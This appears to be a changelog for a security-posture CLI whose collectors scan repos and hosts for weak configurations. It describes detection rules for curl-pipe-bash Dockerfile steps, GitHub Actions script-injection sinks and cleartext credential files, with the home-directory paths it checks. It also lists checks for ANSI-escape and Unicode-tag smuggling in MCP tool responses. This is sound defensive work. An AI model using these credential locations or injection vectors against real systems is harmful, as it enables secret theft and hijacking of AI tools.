`library-author` publish-workflow heuristic re-tightens after the v0.13.48 broadening exposed verification / e2e workflows as false-positive publish.

### Bugs

- **`library-author` publish-workflow heuristic now demotes filename-prefix `test*` / `verify*` / `validate*` / `e2e*` / `kind*` / `check*` / `conformance*` / `coverage*` workflows** regardless of body content. The v0.13.48 broadening (`id-token: write` + `sigstore/cosign-installer` + `cosign sign-blob`) was too aggressive — those signals appear in verification + e2e tests that share signing infrastructure but do not publish. On `sigstore/cosign` the broadened heuristic recognized 6 workflows as publish-related; only 1 (`build.yaml`) actually publishes. The two that genuinely lack `id-token: write` (`kind-verify-attestation.yaml`, `validate-release.yml`) falsely flipped `publish-workflow-no-id-token-write` to `hit`.
- **`cosign sign-blob` no longer counts as a publish-shape command** (matches now requires plain `cosign sign` followed by a non-hyphen — distinguishes container signing from arbitrary-blob signing). `cosign sign-blob` appears as often in e2e tests as it does in publishes; the broader `cosign sign $IMAGE` form remains a strong signal.
- **`sigstore/cosign-installer` reference alone no longer marks a workflow as publish** — the installer is used in verification workflows too. The collector now requires an actual publish-shape command (`ko publish`, `cosign sign`, `crane push`, etc.) or a registry-login action (`docker/login-action`, `google-github-actions/auth` + `gcloud auth configure-docker`, `aws-actions/configure-aws-credentials` + `amazon-ecr`).
- **`id-token: write` permission alone no longer marks a workflow as publish.** Verification + test workflows frequently declare `id-token: write` for OIDC-keyless verification flows.

### Features

- **Registry-login actions recognized as a publish signal.** `docker/login-action`, `google-github-actions/auth` with `gcloud auth configure-docker`, and `aws-actions/configure-aws-credentials` + `amazon-ecr` patterns catch opaque publish paths (e.g. `make sign-ci-containers` after `docker/login-action`) that don't carry a literal publish command in the workflow YAML.

## 0.13.53 — 2026-05-21

Polish round across CLI UX, container false-positives, collector skip-disclosure, and README narrative refresh.

### Bugs

- **`containers` collector demotes the `dockerfile-runs-as-root` indicator on metadata-only Dockerfiles.** A Dockerfile that contains only `FROM <image>` (no `RUN`/`COPY`/`ADD`/`CMD`/`ENTRYPOINT`/`EXPOSE`/`VOLUME`/`WORKDIR`/`USER`/`HEALTHCHECK`/`SHELL` directive) is not a runtime image — it's a base-image probe used by `docker build` to extract a version label or similar. The runs-as-root predicate is meaningless on those; demote.
- **`scan` / `dispatch` / `currency` aliases relabelled in the README as legacy passthroughs.** These verbs dispatch to the v0.10.x orchestrator script and emit the legacy `{timestamp, host, findings}` shape — NOT the canonical verb's structured envelope. The previous README claim ("alias for `discover --scan-only`" / etc.) implied output-shape equivalence; corrected.

### Features

- **`exceptd ask` alternates list now tags collector-backed playbooks with `[collector]`** (matching the discover output convention). Operators see at a glance which routed-to suggestions have a `collect | run` pipe path vs. which require AI-driven evidence.
- **`exceptd collect` emits a stderr skip-disclosure line when the collector's preconditions fail** (e.g. `[collect crypto] precondition not satisfied: linux-platform — empty submission emitted (collector skipped on this host)`). Previously the empty `signal_overrides` on a gated collector looked indistinguishable from "ran but found nothing".
- **Errors render as human text when stderr is a TTY** (interactive operator), and continue to emit the structured JSON envelope when stderr is piped (CI parsers, smart-agent retry, tests). Operators with stderr=tty see `error: <msg>\n  hint: ...\n  suggested: ...` lines; the JSON-by-default contract on piped stderr is preserved. Explicit `--json` / `--pretty` / `--json-stdout-only` forces JSON even on a TTY.
- **README narrative refresh** covering the v0.13.34+ evidence-collection layer: `exceptd collect <playbook>` verb, the discover-collect-run pipe pattern, `--attest-ownership` for cicd-pipeline-compromise, the 13/23 collector coverage, and the pointer to `exceptd doctor --collectors` for the live list.

## 0.13.52 — 2026-05-21

README jurisdiction-count normalization; collect-verb + collector-pipe docs; new predeploy gate verifying AGENTS.md collector enumeration matches `lib/collectors/`.

### Bugs

- **README jurisdiction count normalized to 35 across all three locations.** The preamble previously claimed "38 jurisdictions", the `jurisdiction-clocks.json` description claimed "29 jurisdictions", and the `global-frameworks.json` description claimed "35 jurisdictions" — three different numbers in the same file. The actual count in `data/global-frameworks.json` (top-level keys excluding `_meta` + the two `_*_summary` entries) is 35; all three README mentions now match.

### Features

- **`exceptd collect <playbook>` documented in the CLI command reference.** The verb has shipped since v0.13.34 and now backs 13 of 23 playbooks, but the README only documented `discover` / `brief` / `run` / `ci` / `attest` / `doctor` / `ask` / `refresh` / `lint`. The reference now describes `collect` + the canonical `discover → collect → run --evidence -` pipe + the `--attest-ownership` flag (cicd-pipeline-compromise specific) + the pointer to `exceptd doctor --collectors` for the live list.
- **New predeploy gate: `scripts/check-agents-md-collectors.js`.** Verifies that AGENTS.md's "<N> reference collectors ship today (...)" paragraph stays in sync with the actual contents of `lib/collectors/`. Checks the spelled-out count word (Eleven / Twelve / ...) matches the on-disk count AND every collector path in the parenthesized list exists on disk AND every on-disk collector appears in the list. Predeploy gate count: 17 → 18.

## 0.13.51 — 2026-05-21

`doctor` signing-check renders by severity; `crypto-codebase` weak-hash predicate demotes content-integrity files; `collect` no-arg hint points at operator-facing verbs.

### Bugs

- **`exceptd doctor` signing-check icon now reads the bucketing severity** rather than always painting `[!!]` on `!private_key_present`. Consumer installs (`severity: info`) render `[ok] attestation signing: consumer install (signing is contributor-only; this is the expected state)`; contributor checkouts without keys (`severity: warn`) render `[!]  attestation signing: private key absent (contributor checkout — ...)`; genuine signing errors keep `[!!]`. Operators no longer see `[!!]` next to a "summary: all checks green" line.
- **`exceptd collect` no-arg hint points at `exceptd doctor --collectors` + `exceptd discover`** instead of `lib/collectors/` (a path inside the npm tarball that the operator typically can't browse).
- **`crypto-codebase` weak-hash predicate demotes content-integrity / fingerprinting files.** Hugo's `resources/integrity/integrity.go`, kustomize-style `fingerprint.py`, sphinx-style `cache_key.go`, etc. use MD5 / SHA-1 for content-addressable hashing — legitimate non-security use. The previous predicate's var-flow regex included `integrity` as a security-signal keyword, which fired on Hugo's `integrity.go`. Now: (a) `integrity` is dropped from the var-flow regex; (b) a filename-path demotion catches `integrity.go` / `hashing.go` / `fingerprint.py` / `content_hash.*` / `cache_key.*` / `etag.*` / `build_id.*` shapes and skips them.

## 0.13.50 — 2026-05-21

`sbom` collector recognises pyproject.toml + requirements variants + one-level subdir layouts.

### Bugs

- **`sbom` collector now detects `pyproject.toml` as a Python dependency manifest.** Previously the LOCKFILES catalogue only carried `requirements.txt` / `Pipfile.lock` / `poetry.lock` — Python projects with only a `pyproject.toml` (PEP 621 dependencies array OR `[tool.poetry.dependencies]` block) returned `lockfile-inventory: no lockfile found` and the playbook verdict was inconclusive. Now `pyproject.toml` is parsed: counts entries in `[project.dependencies]`, `[project.optional-dependencies]`, `[tool.poetry.dependencies]`, `[tool.poetry.dev-dependencies]`, and the PEP 621 array-style `dependencies = [...]`.
- **`requirements*.txt` glob.** Variants like `requirements-dev.txt`, `dev-requirements.txt`, `requirements-prod.txt` are now recognized alongside the canonical `requirements.txt`. The glob pattern is `^(?:[a-z0-9_-]+-)?requirements(?:-[a-z0-9_-]+)?\.txt$`. Excluded from glob to avoid double-capture: the literal `requirements.txt` (already in LOCKFILES).
- **One-level subdirectory probe** for canonical lockfile names across `docs/`, `packages/*/`, `backend/`, `frontend/`, `infra/`, `iac/`, `src/`, `app/`. Covers the common `docs/requirements.txt` (sphinx-style doc builds) and monorepo-workspace (`packages/<name>/package-lock.json`) layouts. Walk is hand-listed and capped at one level to keep the collector's filesystem footprint bounded.

## 0.13.49 — 2026-05-21

`discover` covers four previously-invisible collectors. CLI UX cleanup across welcome banner, help text, attestation warning.

### Bugs

- **`discover` recommends `cicd-pipeline-compromise`, `mcp`, `ai-api`, and `crypto`.** Before, the cwd-aware recommender only knew about 9 of the 13 collectors — `discover` from a repo with `.github/workflows/` never surfaced the CI/CD posture playbook; `mcp` / `ai-api` were invisible even when the operator had MCP client config or shell rc files in their home; `crypto` was absent from the Linux branch alongside `hardening` / `runtime`. New probes: `.github/workflows/*.yml` for CI/CD, `~/.cursor/mcp.json` + `~/.config/claude` + `~/.codeium/windsurf/mcp_config.json` + `~/.gemini/settings.json` for MCP clients, `~/.bashrc` + `~/.zshrc` + `~/.profile` for shell rc, plus `crypto` always on Linux.
- **`discover` reason text drops the misleading "node lockfile" claim.** A `package.json`-only repo (no `package-lock.json`) used to receive the recommendation reason "git repo + node lockfile" even though the lockfile didn't exist. The reason now says "node project" (and similarly "python project" / "rust project" / "go project"), which is accurate for the broad manifest-OR-lockfile trigger.
- **`exceptd run --scope code` next-step suggestion is omitted from `discover` when no code-scope playbooks were recommended.** Previously, discover from an empty cwd suggested `exceptd run --scope code` even though no code playbooks applied — operators following the suggestion got every code-scope playbook running against an empty tree and a multi-hundred-KB JSON dump. Now the next-steps list shows `--scope code` only when at least one code-scope recommendation fired.
- **`exceptd help` section header drops the stale `v0.12.0 canonical surface` pin.** The surface evolves with each release; the header now reads `Canonical verbs` without a frozen version label.

### Features

- **Welcome banner enumerates the playbook starting set by trigger rather than by abstract category** (`git repos:`, `GitHub Actions:`, `Linux hosts:`, `AI assistants:`, `containers:`). Each row names the artifact that triggers the recommendation, and the banner explicitly points at `exceptd discover` as the authoritative recommender.
- **Attestation unsigned warning shrinks to a single line on consumer installs.** Previously every `exceptd run` from a globally-installed package (e.g. `npm install -g`) emitted a 4-line warning prescribing `exceptd doctor --fix` — but consumer installs land the package under `node_modules/` where `.keys/` typically isn't writable by the operator. The collector now detects consumer-install layout (PKG_ROOT under `node_modules/` OR parent dir is `@blamejs`) and prints `[attest] writing unsigned attestation (consumer install — signing is contributor-only).` instead. Contributor checkouts still see the full nudge.

## 0.13.48 — 2026-05-21

Collector predicate tightening across `secrets`, `library-author`, `crypto-codebase`, and `cred-stores`.

### Bugs

- **`secrets` collector demotes hits scoped exclusively to test / fixture / example paths.** Previously a JWT literal in `fulcio_test.go` or a private-key block in `cosign-test.key` flipped `jwt-token-with-secret-context` / `ssh-private-key-block` to `hit`. The collector now splits hits into production-scope vs. test-scope (segments `/test/` `/tests/` `/spec/` `/fixtures/` `/examples/` `/samples/` `/demo/` `/testdata/`, plus `*.test.<ext>` / `*.spec.<ext>` / `*_test.<ext>` / `*-test[-.]*` filename conventions). The indicator fires only when at least one production-scope hit exists. Test-only hits stay visible in the `secret-regex-scan-text-files` artifact for operator inspection but don't trip the signal. Mirrors the existing `crypto-codebase` demotion pattern.
- **`library-author` recognises container-native publish workflows.** The previous heuristic only matched npm / pypi / cargo / goreleaser / softprops-action-gh-release publish paths. Workflows using `ko publish` / `cosign sign(-blob)` / `crane push` / `oras push` / `docker push` / `docker/build-push-action` were missed, which falsely flipped `publish-workflow-no-id-token-write` on projects (e.g. sigstore/cosign) that use `id-token: write` for OIDC-based publishing. Now those workflows are recognized as publish-related, AND any workflow declaring `id-token: write` inside a `permissions:` block with executable `steps:` is treated as publish context.
- **`crypto-codebase` test-path demotion now covers Go's `_test.go` convention.** The previous regex matched only `*.test.<ext>` / `*.spec.<ext>` (dot-separated). Go convention is `foo_test.go` (underscore-separated); those test files were not demoted and false-positive'd indicators like `weak-hash-import` (md5 in a Go test using a "token" variable). Added `(?:^|[\\/])[^\\/]+_test\.[a-z]+$` to the demotion regex.

### Features

- **`cred-stores` surfaces a `credentials-file-perms-check` artifact** documenting whether the POSIX-mode-bit check ran (`captured: true` on Linux / macOS) or was skipped (`captured: false, reason: "...skipped on win32..."` on Windows). Previously the `credentials-file-bad-perms` signal was silently absent from `signal_overrides` on Windows, indistinguishable from "indicator not catalogued". Mirrors the `secrets` collector's `world-writable-secret-files` skip pattern.

## 0.13.47 — 2026-05-21

`cicd-pipeline-compromise` collect | run pipe now produces a verdict when the operator opts in to the CI-fleet ownership attestation.

### Bugs

- **`lib/collectors/cicd-pipeline-compromise.js` attests `ci-config-readable` on the success path** (the walked workflow YAML + OIDC trust JSON are genuine evidence of filesystem-read access). Previously the collector emitted only `cwd-is-repo: true`, so the canonical pipe `exceptd collect cicd-pipeline-compromise | exceptd run cicd-pipeline-compromise --evidence -` halted at preflight even when the collector ran successfully.

### Features

- **`exceptd collect cicd-pipeline-compromise --attest-ownership`** opts the operator in to the `operator-owns-ci-fleet` precondition. Without the flag, the playbook's `on_fail: halt` ownership gate stays enforced and the pipe blocks at preflight (as the playbook intends — running collect against a `--cwd <someone-else's-repo>` should not implicitly attest authorization to audit that fleet). With the flag, the operator explicitly attests they own / are authorized to audit the CI fleet rooted at cwd. The flag bridges kebab-case CLI invocation (`--attest-ownership`) and camel-case programmatic invocation (`args.attestOwnership`).

## 0.13.46 — 2026-05-21

`doctor` now health-checks the collector layer.

### Features

- **`doctor --collectors` (and folded into the default `doctor` pass).** Walks every `data/playbooks/<id>.json`, looks up `lib/collectors/<id>.js`, requires the module, verifies `playbook_id` matches the file name AND `collect` is exported as a function. Reports counts via a new `checks.collectors: { ok, total_playbooks, with_collector, without_collector, load_errors, policy_skips }` envelope field. `policy_skips` enumerates the ten judgement-shaped playbooks (incident / governance / pure-analyze) that are intentionally without a collector per AGENTS.md — operators see "10 missing is by design, not regression." Any `load_errors` (require fails, `playbook_id` mismatch, missing `collect` export) fail the gate. Closes the deterministic-collector layer: 13/23 playbooks have collectors, the remaining 10 are policy-skipped.
- **Human renderer** prints `[ok] collector layer: <with>/<total> playbooks have collectors (N judgement-shaped playbooks intentionally without a collector — see AGENTS.md)`. Per-collector load errors render as `[!!] <id>: <error>` lines.

## 0.13.45 — 2026-05-21

`discover` surfaces collector availability per recommendation.

### Features

- **`discover` recommendations now include `collector_available: bool` + `collect_cmd: string|null`.** Each entry in `recommended_playbooks[]` is enriched with on-disk lookup of `lib/collectors/<id>.js`. Operators who discover a relevant playbook for their cwd no longer need to guess whether running it requires manual evidence translation — the next-step command is right there. Playbooks without a collector show the recommendation line unchanged; `exceptd brief <id>` remains the path for manual evidence.
- **Human renderer** prints `[collector]` after the playbook id and a `→ exceptd collect <id> | exceptd run <id> --evidence -` pipe-pointer line for entries where the collector exists. Entries without a collector render unchanged. Padding widened from 20 to 32 columns to accommodate the tag.

## 0.13.44 — 2026-05-21

Thirteenth reference collector.

### Features

- **`lib/collectors/cicd-pipeline-compromise.js`** — consumer-side CI/CD posture collector. Walks `.github/workflows/*.{yml,yaml}` + `.gitlab-ci.yml` + `.circleci/config.yml`, plus `infra/` / `terraform/` / `policies/` / `.aws/` for OIDC trust JSON. Flips five deterministic indicators: `workflow-injection-sink` (`${{ github.event.* }}` interpolated directly inside a `run:` block without env-var indirection — the canonical GHA script-injection class, covers `pull_request.title` / `pull_request.body` / `issue.title` / `issue.body` / `comment.body` / `head_commit.message` / `review.body`), `pull-request-target-with-pr-checkout` (`on: pull_request_target` + `actions/checkout` referencing `github.event.pull_request.head.sha`, `.head.ref`, or `github.head_ref`), `actions-floating-tag-pin` (any third-party `uses: owner/repo@<ref>` where ref isn't a 40-char hex SHA; first-party `actions/*` excluded per playbook), `wildcarded-oidc-sub-claim` (`"token.actions.githubusercontent.com:sub": "*"` or wildcard repo/branch glob in any OIDC trust JSON under the searched roots), `secret-exposed-to-fork-pr` (`pull_request_target` trigger + any `secrets.*` reference other than `GITHUB_TOKEN` in the same workflow). `self-hosted-runner-non-ephemeral` (needs GitHub API runners list), `runner-scoped-signing-key` (needs HSM/KMS inspection) remain AI-driven.

## 0.13.43 — 2026-05-21

Twelfth reference collector.

### Features

- **`lib/collectors/crypto.js`** — host crypto-posture collector. Linux-only. Reads `openssl version -a` / `openssl list -kem-algorithms` / `openssl list -signature-algorithms` (execFile-shape spawning, never shell-interpolated), parses `/etc/ssh/sshd_config` + `sshd_config.d/*.conf` with Include expansion (same logic the hardening collector uses), and lists the `/etc/ssl/certs` trust-anchor count. Flips five deterministic indicators: `openssl-pre-3-5` (banner is `OpenSSL < 3.5.0` — pre-native-ML-KEM), `ml-kem-absent` (no `mlkem512` / `mlkem768` / `mlkem1024` in `openssl list -kem-algorithms`), `ml-dsa-slh-dsa-absent` (no `ML-DSA` / `SLH-DSA` / `SPHINCS+` / `Falcon` in `openssl list -signature-algorithms`), `sshd-no-pqc-kex` (`KexAlgorithms` line absent OR present-without `sntrup761x25519` / `mlkem768x25519` / `mlkem1024`), `weak-mac-or-cipher` (`MACs` containing `hmac-md5` / `hmac-sha1` without `-etm`, or `Ciphers` containing `arcfour` / `3des-cbc` / `des-cbc` / `blowfish-cbc`). When openssl exec fails AND `/etc/ssh/sshd_config` is unreadable, the indicators stay out of `signal_overrides` so the runner returns inconclusive — same unflipped-when-unreadable semantics as `hardening` / `runtime`. `tls-no-hybrid-group` (needs a live TLS handshake), `rsa-2048-cert-long-life` (cert content + chain walk; sensitivity-horizon comparison is operator review), and `no-crypto-inventory` (governance) remain AI-driven. Path overrides via `args.paths` for synthetic-tempdir tests.

## 0.13.42 — 2026-05-20

Eleventh reference collector.

### Features

- **`lib/collectors/mcp.js`** — inspects MCP client configurations across Cursor (`~/.cursor/mcp.json`), Claude Code (`~/.config/claude/config.json`, `~/.claude/settings.json`), Windsurf (`~/.codeium/windsurf/mcp_config.json`), VS Code Copilot (`~/.config/Code/User/settings.json`, macOS / Windows variants, project-level `.vscode/settings.json`), and Gemini CLI (`~/.gemini/settings.json`). Flips four deterministic indicators: `mcp-version-without-integrity` (any `mcpServers.<name>.command` / `args` containing `@scope/pkg@X.Y.Z` or `pkg==X.Y.Z` without an `integrity` / `sha256` / `sri` sibling), `copilot-yolo-mode-flag` (`chat.tools.autoApprove: true` at user-global / workspace scope OR any per-server `autoApprove: true|"all"` in `chat.mcp.servers`), `mcp-response-ansi-escape` (any 0x1B byte in MCP tool-response logs under `~/.claude/logs/mcp/*.jsonl`, `~/.cursor/logs/mcp*.{jsonl,log}`, `~/.codeium/windsurf/logs/mcp*`), `mcp-response-unicode-tag-smuggling` (any codepoint in U+E0000..U+E007F in the same log scope). Defers `unsigned-mcp-manifest` (sigstore lookup), `vulnerable-windsurf-version` (install detection), `mcp-server-running-as-root` (ps + capabilities), `mcp-server-invoked-from-ci-pipeline` (process-tree env-var correlation) — out of stdlib scope.

## 0.13.41 — 2026-05-20

Tenth reference collector.

### Features

- **`lib/collectors/ai-api.js`** — scans shell rc files (`~/.bashrc`, `~/.bash_profile`, `~/.zshrc`, `~/.zprofile`, `~/.profile`, `~/.config/fish/config.fish`, `~/.config/fish/conf.d/*.fish`) and vendor dotfiles (`~/.openai`, `~/.anthropic`, `~/.config/anthropic`, `~/.config/openai`, `~/.gemini`, `~/.config/google-genai`, `~/.config/azure-openai`) for cleartext AI API key exports — OpenAI `sk-*`, Anthropic `sk-ant-*`, Azure OpenAI, Google / Gemini / Generative AI, HuggingFace `hf_*`, Cohere. Honours `export VAR=value`, `VAR=value`, and fish-style `set -gx VAR value` shapes. Reuses the cred-stores carrier inspection for `long-lived-aws-keys` (any AWS profile with `aws_access_key_id` and no `aws_session_token` sibling), `gcp-service-account-json` (`type: service_account` in ADC JSON), `kubeconfig-with-static-token` (`users[].user.token` non-null, not the `auth-provider.config.access-token` sub-key). Behavioral indicators (`ai-api-egress-from-unexpected-process`, `ai-api-anomalous-volume`, `ai-api-beaconing-cadence`, `base64-or-encoded-payload-in-prompts`) need ss / netstat / auditd / process-list correlation and stay unflipped — the runner returns inconclusive and operator-supplied evidence completes the verdict.

## 0.13.40 — 2026-05-20

Ninth reference collector.

### Features

- **`lib/collectors/runtime.js`** — Linux-only runtime-posture collector. Reads `/etc/sudoers` + `/etc/sudoers.d/*`, `/etc/passwd`, walks trusted-path directories (`/etc`, `/usr/local/bin`, `/usr/local/sbin`, `/opt`, `/usr/bin`, `/usr/sbin`) to depth 2 for world-writable files, and inspects `/proc/<pid>` for orphan-privileged processes. Flips four deterministic indicators: `sudoers-nopasswd-wildcard` (any non-root `NOPASSWD: ALL` or `NOPASSWD: /path/*` wildcard rule), `duplicate-uid-zero` (>1 entry in `/etc/passwd` with UID 0), `world-writable-in-trusted-path` (any file under a trusted root with mode bit `o+w`), `orphan-privileged-process` (UID 0 process with PPID 1, canonical-init parent, executable under `/tmp`, `/dev/shm`, `/var/tmp`, or `/home`). Same unflipped-when-unreadable semantics as the hardening collector — when `/etc/sudoers` / `/etc/passwd` / trusted paths / `/proc` are all unreadable, the indicator stays absent from `signal_overrides` so the runner returns inconclusive rather than asserting a clean posture without evidence. Path overrides via `args.paths` for synthetic-tempdir tests.

## 0.13.39 — 2026-05-20

Eighth reference collector.

### Features

- **`lib/collectors/hardening.js`** — Linux-only host-hardening posture collector. Reads `/proc/sys/kernel/kptr_restrict`, `/proc/sys/kernel/unprivileged_userns_clone`, `/proc/sys/kernel/unprivileged_bpf_disabled`, `/proc/sys/kernel/yama/ptrace_scope`, `/proc/sys/fs/suid_dumpable`, `/proc/cmdline`, `/sys/kernel/security/lockdown`, `/etc/ssh/sshd_config` (+ `/etc/ssh/sshd_config.d/*.conf`), and flips eight deterministic indicators: `kptr-restrict-disabled` (`kernel.kptr_restrict == 0`), `unprivileged-userns-enabled` (`kernel.unprivileged_userns_clone == 1`), `unprivileged-bpf-allowed` (`kernel.unprivileged_bpf_disabled == 0`), `yama-ptrace-permissive` (`kernel.yama.ptrace_scope == 0`), `kaslr-disabled-at-boot` (`nokaslr` or `kaslr=off` in `/proc/cmdline`), `mitigations-off` (`mitigations=off` in `/proc/cmdline`), `sshd-permitrootlogin-yes` (effective `yes` or `without-password`), `kernel-lockdown-none` (`[none]` bracket in `/sys/kernel/security/lockdown` OR file absent AND no `lockdown=` cmdline parameter). On non-Linux hosts the precondition `linux-platform` fails and the collector emits an empty submission rather than producing phantom values. Attests `kptr-restrict-disabled__fp_checks[1]` when `/proc/kallsyms` actually leaks non-zero pointer addresses (the catalogued counter-evidence for false-positive demotion). Path overrides via `args.paths` so the collector can be exercised against synthetic tempdir layouts in tests.

## 0.13.38 — 2026-05-20

Seventh reference collector.

### Features

- **`lib/collectors/cred-stores.js`** — inspects local credential carriers (`~/.aws/credentials`, `~/.kube/config`, `~/.docker/config.json`, `~/.npmrc`, `~/.pypirc`, `~/.config/gcloud/application_default_credentials.json`, plus project-level `.npmrc` / `.pypirc` under cwd). Flips seven deterministic indicators from the `cred-stores` playbook: `aws-static-key-present` (any `aws_access_key_id` profile with no `sso_session` / `credential_process` / `role_arn` sibling), `kube-static-token` (any `users[].user.token` field non-null with no `exec:` provider on the same user), `gcp-service-account-json-adc` (`type: "service_account"` in `application_default_credentials.json`), `docker-cleartext-auth` (any `auths[<registry>].auth` field with no `credsStore` / `credHelpers[<registry>]` covering it), `npm-pat-present` (`:_authToken=npm_[A-Za-z0-9]{36,}` in either home or project `.npmrc`), `pypi-token-present` (`password = pypi-[A-Za-z0-9_-]{40,}` in either home or project `.pypirc`), `credentials-file-bad-perms` (POSIX only — any of the listed carriers with mode != 0600). The `aws-sso-cache`, `gcloud-credentials` (SQLite path), `gpg-keys`, `ssh-keys-inventory`, `ssh-config`, `keychain-inventory` artifacts are explicitly marked `captured: false` with a `reason` so the runner records partial-evidence coverage — `ssh-key-rsa-short-bits` / `ssh-key-old` / `gpg-key-old-or-weak` / `all-stores-empty-or-federated` need ssh-keygen / gpg / keychain access that would force a child_process out of the stdlib-only collector contract; left to operator-supplied evidence.

## 0.13.37 — 2026-05-20

Sixth reference collector.

### Features

- **`lib/collectors/crypto-codebase.js`** — audits a consumer repo for cryptographic-primitive misuse. Walks source files (JS/TS/Python/Go/Rust/Java/Ruby/PHP/C/C++/C#/Swift/Obj-C) and flips eight deterministic indicators from the `crypto-codebase` playbook: `weak-hash-import` (MD5 / SHA-1 with same-file flow into auth / integrity / token variables), `weak-cipher-mode` (AES-ECB, DES / 3DES, RC4), `rsa-1024-anywhere` (`modulusLength: 1024` and variants), `math-random-in-security-path` (`Math.random` / `random.random` / `mt_rand` / `rand()` within 200 chars of a `token` / `secret` / `key` / `salt` / `nonce` / `iv` / `seed` / `state` / `jwt` / `csrf` / `session` variable assignment), `pbkdf2-under-iterated` (OWASP 2023 thresholds — SHA256 < 600,000 / SHA512 < 210,000 / SHA1 < 1,300,000), `bcrypt-cost-low` (< 12), `hardcoded-key-material` (PEM markers outside test / spec / fixture / example / sample / demo / doc paths), `tls-old-protocol` (TLSv1.0 / TLSv1.1 / SSLv3 / SSLv23 in `secureProtocol` / `minVersion` / `ssl_version`). Three indicators flip conditionally: `ecdsa-without-pqc-roadmap` fires when classical signature use is observed AND no PQC sig impl AND no hybrid-migration roadmap in README / SECURITY.md; `no-ml-kem-implementation` fires when the library claims PQC-ready in README / SECURITY.md AND no ML-KEM / Kyber / liboqs / noble-post-quantum / oqsprovider call site exists; `fips-claim-without-runtime-activation` fires when the library claims FIPS validation AND no `crypto.setFips(true)` / `OSSL_PROVIDER_load(*, "fips", *)` / `Provider::load(*, "fips")` call site exists. `vendored-pqc-no-provenance` fires when a `vendor/` / `third_party/` subdirectory contains a Kyber / Dilithium / SLH-DSA / SPHINCS+ / Falcon source file AND no `_PROVENANCE.json` / `UPSTREAM` / `ORIGIN` / `.upstream-commit` / `PROVENANCE.md` marker exists at any ancestor up to the vendor root. `no-crypto-agility-abstraction` (behavioral / interface-shape) is left unflipped so the runner returns inconclusive — that one requires operator review of the public API surface.

## 0.13.36 — 2026-05-20

Fifth reference collector.

### Features

- **`lib/collectors/library-author.js`** — audits a publisher-side repository for supply-chain posture markers. Flips 11 deterministic indicators: `publish-workflow-uses-static-token`, `publish-workflow-no-id-token-write`, `publish-workflow-action-refs-mutable` (any `uses: <action>@<ref>` where ref isn't a 40-char SHA), `release-workflow-non-frozen-install` (`npm install` vs `npm ci`, cargo without `--locked`), `publish-workflow-runs-on-self-hosted`, `package-json-provenance-missing` (no `publishConfig.provenance: true`), `lockfile-missing-integrity`, `sbom-absent-or-unsigned`, `no-security-md`, `no-security-txt`, `vendored-no-provenance`. Indicators that require GitHub API / sigstore lookup / GPG identity inspection (`tag-protection-absent`, `private-vuln-reporting-disabled`, `no-rekor-entry-for-latest-release`, etc.) are left unflipped — operator-supplied evidence remains the path for those.

## 0.13.35 — 2026-05-20

Fourth reference collector + a sbom-collector indicator-pattern correction.

### Features

- **`lib/collectors/containers.js`** — companion collector for the `containers` playbook. Walks cwd for Dockerfile / Containerfile / docker-compose.{yml,yaml} / k8s manifests (detected by `apiVersion:` + `kind:` line presence), applies pattern matchers for 11 catalogued deterministic indicators: `dockerfile-from-latest`, `dockerfile-no-digest-pin`, `dockerfile-runs-as-root`, `dockerfile-curl-pipe-bash`, `compose-privileged`, `compose-cap-add-sys-admin`, `compose-host-network`, `compose-docker-sock-mount`, `k8s-privileged`, `k8s-host-namespaces`, `k8s-run-as-root`, `k8s-hostpath-sensitive`, `k8s-image-latest`, `k8s-cluster-admin-binding`. Leaves indicators that require cluster-API access (`psa-policy-permissive-or-absent`, `network-policies-absent-from-workload-namespace`, `k8s-no-seccomp-profile`) unflipped — the runner can decide them when operator-supplied cluster snapshots are available.

## 0.13.34 — 2026-05-20

Evidence-collection layer (Option A from the cold-start workflow audit). New verb `exceptd collect <playbook>` runs a companion script per playbook that walks the cwd, applies the catalogued regex set, stats permissions, and emits the submission JSON in the same shape `exceptd run --evidence -` accepts. The operator pipes:

```bash
exceptd collect secrets | exceptd run secrets --evidence -
```

The collector library is small and grows as playbooks are touched.

### Features

- **New verb `exceptd collect <playbook>`.** Loads `lib/collectors/<playbook>.js`, runs `collect({ cwd, env, args })`, emits the submission JSON. `--cwd <path>` collects against a different repo / host. `--pretty` for indented JSON. Default output is a one-screen human digest (preconditions / artifacts / indicators-that-fired / collector warnings / next-step pipe pointer); `--json` for machine consumption. Exit codes: `0` ok, `1` collector-not-found (the AI-evidence path remains — `exceptd lint <pb> -` documents the submission shape), `2` collector threw unhandled.
- **Three reference collectors ship.** `lib/collectors/secrets.js` walks the cwd tree (depth 6, exclude `node_modules`/`.git`/`dist`/`build`/etc.), runs the catalogued secret regex set against text files (with literal-redaction so the attestation doesn't become a leak vector), stats permission posture on secret-carrier files, and flips `signal_overrides` per indicator that fired. `lib/collectors/kernel.js` derives the `linux-platform` + `uname-available` preconditions, captures `uname -r` + `/proc/cmdline` + selected `/proc/sys/kernel/*` snapshots, and flips `kaslr-disabled` / `unpriv-userns-enabled` / `unpriv-bpf-allowed` from the sysctl values. `lib/collectors/sbom.js` recognises 10 lockfile types (npm / yarn / pnpm / pip / pipenv / poetry / cargo / go / rubygems / composer) plus CycloneDX / SPDX SBOM documents and flips `sbom-document-absent` / `lockfile-absent`.
- **Collector contract codified at `lib/collectors/README.md`.** Pure stdlib + child_process only, synchronous, errors don't throw (surfaced via `collector_errors[]`), literal secret bytes redacted in artifact values, indicators win over artifacts when the collector can decide deterministically.

### Internal

- `AGENTS.md` § Evidence collection roadmap documents the WHY + the precision target for `look.artifacts[].source` strings (file globs + per-platform commands + artifact-id references — not prose) and the when-required policy for adding a collector with a new playbook.

## 0.13.33 — 2026-05-20

### Features

- **`brief` (no arg) renders a scannable per-scope table.** `exceptd brief` with no playbook positional and no `--all` flag now produces a one-screen human digest: header with playbook count + session id, per-scope summary (`service=9  cross-cutting=4  code=4  system=6`), then a bucketed list per scope showing `<id>  tcs=<score>  <domain.name (truncated to 80 chars)>`, then a `Next:` block pointing at `brief <playbook>` for the full info doc, `discover` for cwd-aware recommendations, and `ci --scope <type>` for gating. Previously the verb dumped 36+ KB of JSON to the terminal — exploration was unscannable. `--json` / `--pretty` reach the structured envelope when automating.

## 0.13.32 — 2026-05-20

Two more JSON-only paths get human-renderer treatment.

### Features

- **`run --upstream-check` surfaces version-currency in the human renderer.** The flag fired a registry check and recorded `upstream_check.{local_version, latest_version, behind, same, ahead, days_since_latest_publish}` in the JSON envelope but the human output was silent. Now the verdict block includes `> upstream check: local v<X> == published v<X> (current)` on match, `> upstream check: local v<X> BEHIND published v<Y> (Nd behind) — run \`npm install -g @blamejs/exceptd-skills@latest\`` on lag, and `> upstream check: local v<X> ahead ...` on dev installs.
